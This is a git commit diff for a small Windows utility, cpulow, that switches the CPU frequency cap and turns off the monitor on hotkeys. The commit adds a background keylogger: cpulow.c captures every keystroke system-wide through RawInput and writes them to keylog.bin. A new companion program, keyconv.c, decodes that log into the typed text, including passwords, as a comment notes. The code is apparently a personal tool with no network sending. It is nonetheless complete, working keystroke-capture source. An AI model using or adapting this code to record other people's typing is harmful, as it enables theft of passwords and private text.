76a9001b399a1b7fc3b39c6b79fb9cf61ddc11ec
Alcaro <floating@muncher.se>
2015-12-07 18:31:43 +0100

    Made a keylogger, yay.

--- cpulow.c
+++ cpulow.c
@@ -1,17 +1,18 @@
 //This program sits in the background and listens for a certain keyboard event, and flips the CPU frequency in the power options.
 //On another keyboard event, it turns off the screen, as if the computer has been inactive for a few minutes. No screensaver because screens no longer need saving.
-//Win32 only, only tested on 7.
+//Finally, it logs all keyboard events to a file. This file is rotated each time the program is started, and the previous one is kept.
+//Win32 only, only tested on 7. Defaults to a key that probably doesn't exist for you, chosen because it does absolutely nothing by default on my machine.
 
 #define _WIN32_WINNT 0x0601
 #define INITGUID
 #include <windows.h>
 #include <powrprof.h>
 
+const GUID MaxCpuFreq={0xbc5038f7, 0x23e0, 0x4960, {0x96,0xda,0x33,0xab,0xaf,0x59,0x35,0xec}};
 void SetCPUSpeed(int percent)
 {
 	GUID* CurrentScheme;
 	PowerGetActiveScheme(NULL, &CurrentScheme);
-	GUID MaxCpuFreq={0xbc5038f7, 0x23e0, 0x4960, {0x96,0xda,0x33,0xab,0xaf,0x59,0x35,0xec}};
 	PowerWriteACValueIndex(NULL, CurrentScheme, &GUID_PROCESSOR_SETTINGS_SUBGROUP, &MaxCpuFreq, percent);
 	PowerWriteDCValueIndex(NULL, CurrentScheme, &GUID_PROCESSOR_SETTINGS_SUBGROUP, &MaxCpuFreq, percent);
 	PowerSetActiveScheme(NULL, CurrentScheme);
@@ -24,7 +25,6 @@ int GetCPUSpeed()
 	DWORD size=sizeof(out);
 	GUID* CurrentScheme;
 	PowerGetActiveScheme(NULL, &CurrentScheme);
-	GUID MaxCpuFreq={0xbc5038f7, 0x23e0, 0x4960, {0x96,0xda,0x33,0xab,0xaf,0x59,0x35,0xec}};
 	PowerReadACValue(NULL, CurrentScheme, &GUID_PROCESSOR_SETTINGS_SUBGROUP, &MaxCpuFreq, NULL, (LPBYTE)&out, &size);
 	LocalFree(CurrentScheme);
 	return out;
@@ -50,8 +50,6 @@ void toggle_speed()
 		Beep(1250, 80);
 		Beep(1000, 80);
 	}
-	//Beep(fast ? 1000 : 2000, 200);
-	//Beep(fast ? 2000 : 1000, 200);
 }
 
 void turn_off_monitor()
@@ -59,6 +57,47 @@ void turn_off_monitor()
 	SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2 /*POWER_OFF*/);
 }
 
+HANDLE keylog;
+MSG msg;
+HWND hwndRI; // reusing this window for two completely unrelated tasks makes me a bad person, but who cares
+
+void init_keylog()
+{
+	MoveFileEx("keylog.bin", "keylog-prev.bin", MOVEFILE_REPLACE_EXISTING);
+	keylog=CreateFile("keylog.bin", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+}
+
+char keylogbuf[4096];
+int keylogbufpos;
+
+VOID CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime);
+void log_key(RAWKEYBOARD* key, DWORD time)
+{
+	if (keylogbufpos>0 && (!key || sizeof(keylogbuf)-keylogbufpos < sizeof(DWORD)+sizeof(RAWKEYBOARD)))
+	{
+		DWORD stfu;
+		WriteFile(keylog, keylogbuf, keylogbufpos, &stfu, NULL);
+		keylogbufpos=0;
+	}
+	if (key)
+	{
+		memcpy(keylogbuf+keylogbufpos, &time, sizeof(DWORD)); keylogbufpos+=sizeof(DWORD);
+		memcpy(keylogbuf+keylogbufpos, key, sizeof(RAWKEYBOARD)); keylogbufpos+=sizeof(RAWKEYBOARD);
+		
+		//https://msdn.microsoft.com/en-us/library/windows/desktop/ms644906%28v=vs.85%29.aspx
+		//If the hWnd parameter is not NULL and the window specified by hWnd already has a timer
+		//with the value nIDEvent, then the existing timer is replaced by the new timer.
+		//
+		//doesn't matter which window I use, so just pick whatever
+		SetTimer(hwndRI, 1, 1000, TimerProc);
+	}
+}
+VOID CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime)
+{
+	log_key(NULL, 0);
+}
+
+MSG msg;
 void handle_event(RAWINPUT* input)
 {
 	if (input->header.dwType==RIM_TYPEKEYBOARD)//unneeded check, we only ask for keyboard; could be relevant later, though.
@@ -90,6 +129,7 @@ void handle_event(RAWINPUT* input)
 				Beep(1000, 80);
 			}
 		}
+		log_key(&input->data.keyboard, msg.time);
 	}
 }
 
@@ -126,14 +166,14 @@ void InitRawInput()
 	wc.lpszClassName="RawInputClass";
 	RegisterClass(&wc);//this could fail if it's already regged, but in that case, the previous registration remains so who cares.
 	
-	HWND hwnd=CreateWindow("RawInputClass", "RawInputClass", WS_POPUP, 0, 0, 64, 64, HWND_MESSAGE, NULL, GetModuleHandle(NULL), NULL);
+	hwndRI=CreateWindow("RawInputClass", "RawInputClass", WS_POPUP, 0, 0, 64, 64, HWND_MESSAGE, NULL, GetModuleHandle(NULL), NULL);
 	
 	RAWINPUTDEVICE device[1];
 	//capture all keyboard input
 	device[0].usUsagePage=1;
 	device[0].usUsage=6;
 	device[0].dwFlags=RIDEV_INPUTSINK/*|RIDEV_DEVNOTIFY*/;
-	device[0].hwndTarget=hwnd;
+	device[0].hwndTarget=hwndRI;
 	RegisterRawInputDevices(device, 1, sizeof(RAWINPUTDEVICE));
 }
 
@@ -147,22 +187,9 @@ int main(int argc, char * argv[])
 		return 0;
 	}
 	
+	init_keylog();
 	InitRawInput();
 	
-	WNDCLASS wc;
-	wc.style=0;
-	wc.lpfnWndProc=window_proc;
-	wc.cbClsExtra=0;
-	wc.cbWndExtra=0;
-	wc.hInstance=GetModuleHandle(NULL);
-	wc.hIcon=LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(1));
-	wc.hCursor=LoadCursor(NULL, IDC_ARROW);
-	wc.hbrBackground=GetSysColorBrush(COLOR_3DFACE);
-	wc.lpszMenuName=NULL;
-	wc.lpszClassName="RawInputClass";
-	RegisterClass(&wc);//this could fail if it's already regged, but in that case, the previous registration remains so who cares.
-	
-	MSG msg;
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
 		TranslateMessage(&msg);
---
+++ keyconv.c
@@ -0,0 +1,122 @@
+//This program takes a key log from cpulow and prints the text entered.
+//Should be easily portable to everything, but since the parent is Win32 only, I don't care.
+//Also hardcoded to decoding according to Swedish keyboard layout, into the codepage 850 (Windows console) charset.
+//It works for me, that's all I care about.
+
+#define _WIN32_WINNT 0x0501
+#include <windows.h>
+#include <stdio.h>
+#include <stdbool.h>
+#include <ctype.h>
+
+//typedef struct tagRAWKEYBOARD {
+//  USHORT MakeCode;
+//  USHORT Flags;
+//  USHORT Reserved;
+//  USHORT VKey;
+//  UINT   Message;
+//  ULONG  ExtraInformation;
+//} RAWKEYBOARD, *PRAWKEYBOARD, *LPRAWKEYBOARD;
+
+int main(int argc, char * argv[])
+{
+	FILE* raw=fopen(argv[1] ? argv[1] : "keylog.bin", "rb");
+	typedef struct event_t {
+		DWORD time; // timestamp is in milliseconds, likely since device boot
+		RAWKEYBOARD key;
+	} event;
+	fseek(raw, 0, SEEK_END);
+	int len=ftell(raw)/sizeof(event);
+	event* evs=malloc(len*sizeof(event));
+	fseek(raw, 0, SEEK_SET);
+	fread(evs, sizeof(event),len, raw);
+	
+	bool* st_vk=calloc(65536,1);
+	bool* st_sc=calloc(65536,1);
+	
+	//keymaps: [altgr*2 + shift][vkey];
+	static char keymaps[4][0x100]={};
+	memset(keymaps, 0, sizeof(keymaps));
+	
+	for (int i='A';i<='Z';i++)
+	{
+		keymaps[0][i]=tolower(i);
+		keymaps[1][i]=i;
+	}
+	for (int i='0';i<='9';i++)
+	{
+		keymaps[0][i]=i;
+	}
+	memcpy(&keymaps[1]['0'], "=!\"#\xF8%&/()", 10);
+	keymaps[0][' ']=' ';
+	keymaps[1][' ']=' ';
+	
+	keymaps[2]['2']='@';
+	keymaps[2]['4']='$';
+	keymaps[2]['7']='{';
+	keymaps[2]['8']='[';
+	keymaps[2]['9']=']';
+	keymaps[2]['0']='}';
+	
+	keymaps[0][VK_OEM_PLUS]='+'; keymaps[1][VK_OEM_PLUS]='?'; keymaps[2][VK_OEM_PLUS]='\\';
+	keymaps[0][VK_OEM_COMMA]=','; keymaps[1][VK_OEM_COMMA]=';';
+	keymaps[0][VK_OEM_MINUS]='-'; keymaps[1][VK_OEM_MINUS]='_';
+	keymaps[0][VK_OEM_PERIOD]='.'; keymaps[1][VK_OEM_PERIOD]=':';
+	keymaps[0][VK_OEM_2]='\''; keymaps[1][VK_OEM_2]='*';
+	keymaps[0][VK_OEM_3]=0x94; keymaps[1][VK_OEM_3]=0x99; //ö
+	keymaps[0][VK_OEM_6]=0x86; keymaps[1][VK_OEM_6]=0x8F; //å
+	keymaps[0][VK_OEM_7]=0x84; keymaps[1][VK_OEM_7]=0x8E; //ä
+	keymaps[0][VK_OEM_102]='<'; keymaps[1][VK_OEM_102]='>'; keymaps[2][VK_OEM_102]='|';
+	
+	keymaps[0][VK_RETURN]='\n';
+	keymaps[1][VK_RETURN]='\n';
+	
+	keymaps[0][VK_LEFT]=0x1B;
+	keymaps[0][VK_UP]=0x18;
+	keymaps[0][VK_RIGHT]=0x1A;
+	keymaps[0][VK_DOWN]=0x19;
+	
+	keymaps[0][VK_SHIFT]=-1;
+	keymaps[1][VK_SHIFT]=-1;
+	keymaps[2][VK_SHIFT]=-1;
+	keymaps[3][VK_SHIFT]=-1;
+	keymaps[0][VK_MENU]=-1;
+	keymaps[1][VK_MENU]=-1;
+	keymaps[2][VK_MENU]=-1;
+	keymaps[3][VK_MENU]=-1;
+	
+	for (int i=0;i<len;i++)
+	{
+		event* ev=&evs[i];
+		bool down=(!(ev->key.Flags&RI_KEY_BREAK));
+		
+		if (down)
+		{
+			int vk=ev->key.VKey;
+			int sc=ev->key.MakeCode;
+			bool shift=(st_vk[VK_SHIFT]);
+			
+			//can't differentiate between alt and altgr
+			//there are the E0/E1 bits in Flags, but they're not in st_vk/sc
+			//but nobody types stuff while holding alt anyways. except alt-f4 and that is not part of your password.
+			bool altgr=(st_vk[VK_MENU]);
+			
+			int ch=0;
+			if (vk<=0x100) ch=keymaps[altgr*2+shift][vk];
+			if (ch==0) ch=0xDB;//in codepage 850, this is U+2588 █
+			if (ch!=-1) putchar(ch);
+		}
+		//printf("\tvk=%.2X sc=%.2X dn=%i\n",ev->key.VKey,ev->key.MakeCode, down);
+//printf("\t%i %.4X %.4X %.4X %.4X %.8X %.8X\n",
+//ev->time,
+//ev->key.MakeCode,
+//ev->key.Flags,
+//ev->key.Reserved,
+//ev->key.VKey,
+//ev->key.Message,
+//ev->key.ExtraInformation);
+		
+		st_vk[ev->key.VKey]=down;
+		st_sc[ev->key.MakeCode]=down;
+	}
+}
